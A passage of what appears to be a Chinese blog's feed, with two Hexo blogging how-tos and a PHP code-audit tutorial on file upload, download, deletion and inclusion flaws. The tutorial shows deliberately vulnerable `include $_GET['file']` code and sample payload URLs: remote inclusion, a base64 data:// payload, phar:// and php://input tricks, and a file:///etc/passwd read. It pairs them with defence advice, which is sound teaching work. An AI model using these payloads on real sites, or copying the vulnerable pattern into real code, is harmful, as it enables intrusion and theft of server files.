    <id>https://fz1lin.com/2021/2056430684/</id>
    <published>2021-12-01T10:59:41.000Z</published>
    <updated>2021-12-22T11:54:56.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Hexo文章管理"><a href="#0x01-Hexo文章管理" class="headerlink" title="0x01 Hexo文章管理"></a>0x01 Hexo文章管理</h2><h3 id="1-创建一个md文件"><a href="#1-创建一个md文件" class="headerlink" title="1.创建一个md文件"></a>1.创建一个<a href="https://www.zhihu.com/search?q=md%E6%96%87%E4%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:156915260%7D">md文件</a></h3><p>md文件也就是<code>Markdown</code>文件，通过以下命令来创建：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new &lt;title&gt;</span><br><span class="line">hexo new <span class="string">&quot;我的第一篇文章&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-布局（layout）"><a href="#2-布局（layout）" class="headerlink" title="2.布局（layout）"></a>2.布局（layout）</h3><ul><li>创建md文件时，我们可以指定布局</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">new</span> [<span class="string">layout</span>] <span class="string">&lt;title&gt;$</span> <span class="string">hexo</span> <span class="string">new</span> <span class="string">page</span> <span class="string">&quot;我的页面&quot;</span></span><br></pre></td></tr></table></figure><ul><li>布局有三种：<code>post</code>（文章）、<code>draft</code>（草稿）、<code>page</code>（页面）</li></ul><p>在新建文件时，Hexo 会根据 <code>scaffolds</code> 文件夹内相对应的文件（可以理解为模板）来建立md文件：</p><h3 id="3-草稿（draft）"><a href="#3-草稿（draft）" class="headerlink" title="3.草稿（draft）"></a>3.草稿（draft）</h3><p><code>draft</code>这种布局在建立时会被保存到 <code>source/_drafts</code> 文件夹中，但不会显示在页面上，如果我们不想某一篇文章显示在页面上，那么就可以把它移动到<code>_drafts</code>文件夹中。</p><ul><li>我们可在启动服务器时加上 <code>--draft</code> 参数来查看草稿。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">server</span> <span class="string">--draft</span></span><br></pre></td></tr></table></figure><ul><li>还可以在站点配置文件中把 <code>render_drafts</code> 参数设为 <code>true</code> 来预览草稿。</li><li>我们可以通过 <code>publish</code> 命令将草稿发布文章或者页面，它将会被移动到指定的文件夹。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">publish</span> [<span class="string">layout</span>] <span class="string">&lt;title&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-概述文章"><a href="#0x02-概述文章" class="headerlink" title="0x02 概述文章"></a>0x02 概述文章</h2><h3 id="方法一：写概述"><a href="#方法一：写概述" class="headerlink" title="方法一：写概述"></a>方法一：写概述</h3><p>在对应文章对 <code>front-matter</code>（文章文件最上方以 <code>---</code>分割对区域，是用来指定个别文件的配置变量区域）中添加<code>description</code>变量，其中<code>description</code>变量设置的内容就会被显示在首页上门，其余的文案一律不显示。配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span> <span class="string">写作清单</span></span><br><span class="line"><span class="attr">categories:</span>  <span class="string">Hexo</span>   <span class="string">//分类</span></span><br><span class="line"><span class="attr">tags:</span>               <span class="string">//标签</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">写作博客的流程</span>   <span class="string">//概述</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>这一种方法是需要自己写概述，所以比较费事，于是就有了第二种方法。</p><h3 id="方法二：文章截断显示"><a href="#方法二：文章截断显示" class="headerlink" title="方法二：文章截断显示"></a>方法二：文章截断显示</h3><p>这种方法只需要在对应的文章里，想要展示的文章后添加以下标签就可以了</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;!--more--&gt;</span></span><br></pre></td></tr></table></figure><p>然后首页就会显示在这个标签以上的所有内容，隐藏文章下面的所有内容。 </p><h2 id="0x03-Front-matter-预定设置"><a href="#0x03-Front-matter-预定设置" class="headerlink" title="0x03 Front-matter 预定设置"></a>0x03 Front-matter 预定设置</h2><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><h3 id="1-为文章添加分类与标签"><a href="#1-为文章添加分类与标签" class="headerlink" title="1.为文章添加分类与标签"></a>1.为文章添加分类与标签</h3><p>只有文章（post布局）支持分类和标签，需要在<code>Front-matter</code>中设置。分类有层级关系，标签没有。</p><p>举个例子：<br>1）下面文章它的标签是：Hexo、博客<br>2）分类是： 个人博客 &gt; Hexo博客<br>3）“Hexo博客” 是 “个人博客” 的子分类</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">个人博客（第一层级）</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Hexo博客（第二层级）</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">博客</span></span><br></pre></td></tr></table></figure><h3 id="2-为文章添加多个分类"><a href="#2-为文章添加多个分类" class="headerlink" title="2.为文章添加多个分类"></a>2.为文章添加多个分类</h3><p>1）下面文章属于三个分类：日常 &gt; 生活，日常 &gt; 随想，日记<br>2）其中生活、随想为日常的子分类，日常和日记为同级分类</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> [<span class="string">日常</span>, <span class="string">生活</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">日常</span>, <span class="string">随想</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">日记</span>]</span><br></pre></td></tr></table></figure><h2 id="0x03-部署命令"><a href="#0x03-部署命令" class="headerlink" title="0x03 部署命令"></a>0x03 部署命令</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul><li>清除缓存：<code>hexo clean</code></li><li>生成静态文件：<code>hexo generate</code>可简写为 <code>hexo g</code></li><li>启动服务器：<code>hexo server</code>或者 <code>hexo s</code> 常用参数：<code>-p（--port）</code>重设端口</li><li>部署：<code>hexo deploy</code>可简写为<code>hexo d</code>，用于将网站部署到服务器上。（暂时用不到，目前都是在本地，后面我们将博客托管到<code>GitHub Pages</code>或<code>Gitee Pages</code>时才会用到此命令）<br>常用参数：<code>-g（--generate）</code>，<code>hexo d -g</code>部署前预先生成静态文件，等同于 <code>hexo g -d</code></li></ul><p>发布文章或者修改博客后执行流程：</p><p>清除缓存&gt;生成静态文件&gt;启动服务器，测试没问题后再部署。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 我们可以写成一条命令</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Hexo 写作流程的概述，包含了命令，设置等</summary>
    
    
    
    <category term="Hexo-about" scheme="https://fz1lin.com/categories/Hexo-about/"/>
    
    
    <category term="Hexo" scheme="https://fz1lin.com/tags/Hexo/"/>
    
    <category term="blog" scheme="https://fz1lin.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>Hexo 图片存放的问题</title>
    <link href="https://fz1lin.com/2021/448087847/"/>
    <id>https://fz1lin.com/2021/448087847/</id>
    <published>2021-12-03T02:02:32.000Z</published>
    <updated>2021-12-22T11:54:24.994Z</updated>
    
    <content type="html"><![CDATA[<p>如果使用 typora，默认上传服务器是找不到图片的，所以要开启该功能</p><h2 id="配置站点配置文件"><a href="#配置站点配置文件" class="headerlink" title="配置站点配置文件"></a>配置站点配置文件</h2><p>是根目录下的 <code>_config.yml</code> 的配置文件</p><p>搜索</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">post_asset_folder:true</span></span><br></pre></td></tr></table></figure><p>在博客根目录下，安装插件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">npm</span> <span class="string">install</span> <span class="string">https://github.com/CodeFalling/hexo-asset-image</span> <span class="string">--save</span></span><br></pre></td></tr></table></figure><p>然后可以将typora的路径改为</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./$&#123;filename&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/448087847/image-20211203100700456.png" alt="image-20211203100700456"> </p><p>修改成功后 </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">s</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><p>创建文章会在 <code>source/_posts</code>目录下创建同名文件夹和同名的.md 文件</p>]]></content>
    
    
    <summary type="html">如果使用 typora，默认上传服务器是找不到图片的，所以要开启该功能</summary>
    
    
    
    <category term="Hexo-about" scheme="https://fz1lin.com/categories/Hexo-about/"/>
    
    
    <category term="Hexo" scheme="https://fz1lin.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计-文件类型漏洞</title>
    <link href="https://fz1lin.com/2021/2734680967/"/>
    <id>https://fz1lin.com/2021/2734680967/</id>
    <published>2021-12-19T11:31:49.000Z</published>
    <updated>2021-12-19T11:35:47.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>文件类型漏洞，分为四种，文件上传，文件下载，文件删除，文件包含漏洞。</p><h2 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传"></a>0x01 文件上传</h2><h3 id="1-漏洞概述"><a href="#1-漏洞概述" class="headerlink" title="1.漏洞概述"></a>1.漏洞概述</h3><p>文件上传漏洞，是将一个可执行的脚本，上传到服务器，通过此脚本在服务端执行命令，获取 webshell，该漏洞危害巨大，原因是开发者，没有上传文件的进行相关的安全检查，或者检查的不完整，从而导致文件上传漏洞，对应相关业务场景，上传附件，头像等</p><p>文件上传细分为四类</p><ul><li>任意文件上传。在上传功能处，没有做任何过滤，直接可以获得webshell权限。</li><li>前端校验漏洞。在上传功能处，有检验文件扩展名，或者以白名单，黑名单的形式过滤，js检测不严谨，使用抓包工具，直接绕过，相当于没有。</li><li>后端校验漏洞。常见后端校验有MIME类型检测，目录路径检测、文件扩展名检测、文件内容检测，如果设置不当，也会造成漏洞。</li><li>解析漏洞。指 Web 服务对 HTTP 请求处理不当，导致将不能执行的脚本、文件，当做可以执行的脚本，文件等。该漏洞一般配合文件上传功能实现，具体的要看中间件解析漏洞，如IIS、Apache、nginx 等。</li></ul><p>具体的绕过方式，可搭建对应的靶场进行复现，深入理解原理及各种上传姿势 <a href="https://github.com/c0ny1/upload-labs">upload-labs</a></p><p>这是靶场总结的思维导图</p><p><img src="/2021/2734680967/mind-map.png" alt="mind-map.png"> </p><h3 id="2-审计思路"><a href="#2-审计思路" class="headerlink" title="2.审计思路"></a>2.审计思路</h3><p>既然是文件上传，那就判断哪些地方可能存在上传点，自己搭建对应的环境，分析可能存在上传的点，然后分析危害程度（文件上传是在本地还是远程，是否存在脚本执行或者环境支持等），然后进行分析，文件校验的功能是否完善，可从，前端js 对上传文件的后缀名进行校验，以及后端，是黑名单、白名单、HTTP header的Conten-type，文件头验证，二次渲染验证和文件名随机化等。</p><p><img src="/2021/2734680967/sum_up.png" alt="sum_up.png"> </p><p>综上所述：审计的要点，找到上传点，也可以使用函数搜索<code>$_FILES</code>，找到上传点</p><p>然后根据上传点，可以进行以下流程审计</p><ul><li>是否有文件后缀名校验</li><li>是否有文件内容检验</li><li>是否有文件类型检验</li><li>文件类型是否校验</li><li>文件上传路径是否校验</li><li>文件目录是否禁止脚本解析</li></ul><h3 id="3-防御建议"><a href="#3-防御建议" class="headerlink" title="3.防御建议"></a>3.防御建议</h3><ol><li>对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</li><li>严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</li><li>对上传文件格式进行严格校验，防止上传恶意脚本文件；</li><li>严格限制上传的文件路径。</li><li>文件扩展名服务端白名单校验。</li><li>文件内容服务端校验。</li><li>上传文件重命名。</li><li>隐藏上传文件路径。</li></ol><h2 id="0x02-文件下载"><a href="#0x02-文件下载" class="headerlink" title="0x02 文件下载"></a>0x02 文件下载</h2><h3 id="1-漏洞概述-1"><a href="#1-漏洞概述-1" class="headerlink" title="1.漏洞概述"></a>1.漏洞概述</h3><p>文件下载也叫目录穿越/目录遍历，文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符<code>../</code>跳出程序本身的限制目录，来下载或显示任意文件。该漏洞能下载，配置文件，日志，有权限管控的敏感文件等，</p><p>漏洞产生通常在文件查看，文件下载功能中。</p><h3 id="2-审计思路-1"><a href="#2-审计思路-1" class="headerlink" title="2.审计思路"></a>2.审计思路</h3><p>在分析该漏洞或进行审计时，通常使用<code>../</code>来逐个层架查看推测路径信息，以最大限度地遍历所有可能藏在文件下载漏洞的部分，常用的函数有</p><ul><li>file_get_contents()</li><li>file()</li><li>readfile()</li><li>fread()</li><li>fgets()</li></ul><p>在CTF中通常使用 php://filter来查看源码信息</p><p>初步判断是否存在文件下载漏洞</p><ul><li>可以下载或读文件的函数且参数是否可控</li><li>可以下载或读文件的路径是否未校验或校验不严谨</li><li>下载或可读的文件是否为空，或者说明能否看到文件的源内容</li></ul><p>审计的思路，重点找函数，然后进行构造利用，看漏洞的影响范围。</p><h3 id="2-防御建议"><a href="#2-防御建议" class="headerlink" title="2.防御建议"></a>2.防御建议</h3><p>对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。</p><h2 id="0x03-文件删除"><a href="#0x03-文件删除" class="headerlink" title="0x03 文件删除"></a>0x03 文件删除</h2><h3 id="1-漏洞概述-2"><a href="#1-漏洞概述-2" class="headerlink" title="1.漏洞概述"></a>1.漏洞概述</h3><p>文件删除漏洞，可让攻击者随意删除服务器上的任意或指定文件。</p><p>漏洞点，剪贴，删除文件，清除文件等</p><h3 id="2-审计思路-2"><a href="#2-审计思路-2" class="headerlink" title="2.审计思路"></a>2.审计思路</h3><p>函数搜索，关键函数  <a href="https://www.php.net/manual/zh/function.unlink.php">unlink</a></p><p>在 JavaScript中搜索，fiel.delete或 delete、delFile、delDir等函数关键词，定位关键词，分析关键位置的上下文代码，重点分析是否可存在可控文件参数，是否有校验或者校验可绕过</p><h3 id="3-防御建议-1"><a href="#3-防御建议-1" class="headerlink" title="3.防御建议"></a>3.防御建议</h3><p>对unlink 函数，或者可能存在删除文件的地方，进行加固</p><h2 id="0x03-文件包含"><a href="#0x03-文件包含" class="headerlink" title="0x03 文件包含"></a>0x03 文件包含</h2><h3 id="1-漏洞概述-3"><a href="#1-漏洞概述-3" class="headerlink" title="1.漏洞概述"></a>1.漏洞概述</h3><p>文件包含，是将指定的包含或引用的目标文件嵌入到程序空间，并且该引入的参数，用户是可控且没有对其进行安全校验，导致包含恶意代码的文件嵌入到程序空间并得到解析执行，从而造成文件包含漏洞。</p><p>PHP 文件包含关键函数</p><table><thead><tr><th>函数</th><th>概述</th></tr></thead><tbody><tr><td><a href="https://www.php.net/manual/zh/function.include.php">include</a></td><td>包含多次</td></tr><tr><td>include_once</td><td>包含一次</td></tr><tr><td>require</td><td>包含多次</td></tr><tr><td>require_once</td><td>包含一次</td></tr><tr><td><a href="https://www.php.net/manual/zh/function.file-get-contents">file_get_contents</a></td><td>将整个文件读入一个字符串</td></tr><tr><td>fopen</td><td>打开文件或者 URL</td></tr><tr><td>file</td><td>把整个文件读入一个数组中</td></tr><tr><td>readfile</td><td>输出文件</td></tr></tbody></table><p>JavaScript 包含执行</p><ul><li><code>include</code></li><li><code>jsp:include</code></li><li><code>c:import</code></li></ul><p>文件包含分为三种：</p><ul><li>本地文件包含（Local File Include）</li><li>远程文件包含（Remote File Include）</li><li>PHP伪协议</li></ul><p>其中，本地文件包含漏洞，一般是上传或日志缓存，写入等方法来包含恶意文件，远程文件包含漏洞是引入远程的恶意文件，恶意代码。</p><h3 id="2-本地文件包含-LFI"><a href="#2-本地文件包含-LFI" class="headerlink" title="2.本地文件包含 LFI"></a>2.本地文件包含 LFI</h3><p>包含本地服务器的文件且能正常执行被包含文件的代码就是本地文件包含</p><p>案例：普通本地包含漏洞</p><p>新建test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>新建 test.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?file=test.txt</span></span><br></pre></td></tr></table></figure><p><img src="/2021/2734680967/image-20211219170025799.png" alt="image-20211219170025799"> </p><p>test.php 代码中，include 使用 GET 类型接收用户的文件，进行包含，我们在该目录下，创建了一个 test.txt 文件，我们传入了文件的名字，然后代码执行将 test.txt 包含在 test.php 代码中执行了代码。触发了恶意代码。</p><h3 id="3-远程文件包含-RFI"><a href="#3-远程文件包含-RFI" class="headerlink" title="3.远程文件包含 RFI"></a>3.远程文件包含 RFI</h3><p>在远程包含需要满足以下条件：</p><ul><li>php.ini中的 <code>allow_url_fopen</code>和<code>allow_url_include</code>都为 On ，修改完配置文件，需要重启服务</li></ul><p><img src="/2021/2734680967/image-20211219172537874.png" alt="image-20211219172537874"> </p><ul><li>被包含文件没有目录限制，或可控的文件，恶意代码，数据流可被引入解析</li></ul><p>符合以上条件就是远程文件包含漏洞</p><p>案例：普通远程文件包含</p><p>远程服务器上建立 test3.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;存在远程包含漏洞&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地服务器上建立 test3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test3.php?file=http://192.168.1.105/test3.txt</span></span><br></pre></td></tr></table></figure><p><img src="/2021/2734680967/image-20211219173401170.png" alt="image-20211219173401170"> </p><p>漏洞分析</p><p>和本地包含类似，只是把访问地址改成了远程地址，然后触发了漏洞</p><h3 id="4-PHP-伪协议"><a href="#4-PHP-伪协议" class="headerlink" title="4.PHP 伪协议"></a>4.PHP 伪协议</h3><p>PHP封装协议又叫伪协议，此种类型经常在CTF中用到。</p><ul><li><a href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li><li><a href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li><li><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li><li><a href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li><li><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li><li><a href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li><li><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li><li><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li><li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li><li><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li><li><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li><li><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li></ul><p>有的协议受限制，allow_url_fopen 和 allow_url_include 的限制</p><p><img src="/2021/2734680967/webp.webp" alt="img"> </p><p>一般在PHP后缀名存在限制且多种阶段方式无法生效时，可使用 PHP 伪协议文件包含漏洞。</p><h4 id="4-1-phar-协议利用"><a href="#4-1-phar-协议利用" class="headerlink" title="4.1 phar:// 协议利用"></a>4.1 phar:// 协议利用</h4><p>新建 test1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将test1.txt 文件压缩存储为test1.zip 通过浏览器访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test1.php?file=phar://test1.zip/test1.txt</span></span><br></pre></td></tr></table></figure><p>通过phar://协议读取test1.zip 压缩包里的test1.txt 的原始内容即并解析执行，触发恶意代码</p><p><img src="/2021/2734680967/image-20211219184700210.png" alt="image-20211219184700210"> </p><h4 id="4-2-data-协议"><a href="#4-2-data-协议" class="headerlink" title="4.2 data:// 协议"></a>4.2 data:// 协议</h4><p>在本地服务器新建 test11.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过浏览器访问路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test11.php?file=data://text/plain;base64,PD9waHAKIHBocGluZm8oKTsKPz4=</span></span><br></pre></td></tr></table></figure><p><img src="/2021/2734680967/image-20211219185739250.png" alt="image-20211219185739250"> </p><p>使用base64 进行编码成为数据流的</p><p><img src="/2021/2734680967/image-20211219185821830.png" alt="image-20211219185821830"> </p><h4 id="4-3-php-input-协议"><a href="#4-3-php-input-协议" class="headerlink" title="4.3 php://input 协议"></a>4.3 php://input 协议</h4><p>新建 test12.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test12.php?file=php://input</span></span><br></pre></td></tr></table></figure><p>并且post data 为发送的payload</p><p><img src="/2021/2734680967/image-20211219191128216.png" alt="image-20211219191128216"> </p><p>关于<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php://filter</a>的妙用可以参考 p牛的这篇文章。</p><h4 id="4-4-file"><a href="#4-4-file" class="headerlink" title="4.4 file://"></a>4.4 file://</h4><p>用于访问文件（绝对路径，相对路径，网络路径）</p><p>如果是Linux可以读取该文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?file=file:///etc/passwd</span></span><br></pre></td></tr></table></figure><h3 id="5-审计思路"><a href="#5-审计思路" class="headerlink" title="5.审计思路"></a>5.审计思路</h3><p>查看 PHP 代码函数的关键字，然后查看该函数使用的参数是否为可控变量，对可控变量所在的代码功能模块寻找上传，日志记录等功能，确认是否能够设置“包含操作”。通过日志记录，确认能够通过构造其 URL 地址并将构造好的 payload 嵌入进去。</p><h3 id="6-防御建议"><a href="#6-防御建议" class="headerlink" title="6.防御建议"></a>6.防御建议</h3><ol><li>严格检查变量是否已经初始化。防止变量覆盖。</li><li>对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</li><li>严格检查文件包含函数中的参数是否外界可控。</li><li>尽量不要使用<code>allow_url_fopen</code>和<code>allow_url_include</code> 功能，并将这两个功能关闭。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在PHP代码审计中，审计文件类型漏洞，需要注意漏洞产生的关键函数，进行分析，查看该变量是否为可控变量，是否有过滤，过滤能否被绕过，都需要一一尝试，然后分析漏洞的危害程度。</p><p>参考链接</p><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p><a 